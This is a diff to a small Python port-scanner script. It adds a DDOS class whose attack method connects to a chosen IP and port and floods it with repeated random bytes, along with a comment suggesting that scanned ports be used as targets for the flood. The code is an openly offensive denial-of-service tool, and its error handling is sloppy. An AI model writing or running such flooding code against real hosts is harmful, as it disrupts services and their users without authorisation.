@@ -3,11 +3,16 @@ import socket
 import colorama
 from colorama import Fore as f
 from pyfiglet import figlet_format as ff
+import random
 
 colorama.init(autoreset=True)
 
-class Scan:
+"""
+self note :- you can use port scan along with ddos to find a port to attack
+"""
 
+class Scan:
+    
     def __init__(self) -> None:
         os.system('clear')
         print(f.RED + ff("Port Scanner"))
@@ -50,6 +55,36 @@ class Scan:
 
     def get_open_ports(self) -> list:
         return self.open_ports
+    
+    def save(self,file_name = '') -> None:
+        with open(file_name,'w') as wf:
+            wf.write(str(self.get_open_ports()))
+
 
     def close(self) -> None:
         os.system('clear')
+
+class DDOS:
+    def __init__(self, ip, port) -> None:
+        os.system('clear')
+        print(f.RED + ff("DDOS"))
+
+        self.ip = ip
+        self.port = port
+    
+    def attack(self,it=0) -> None:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+            s.connect_ex((self.ip,self.port))
+            print('connect succed')
+            for i in range (it):
+                s.send(random._urandom(10) * 100)
+            
+            
+        except Exception:
+            print(f'error {Exception}')
+        
+
+
+        
+
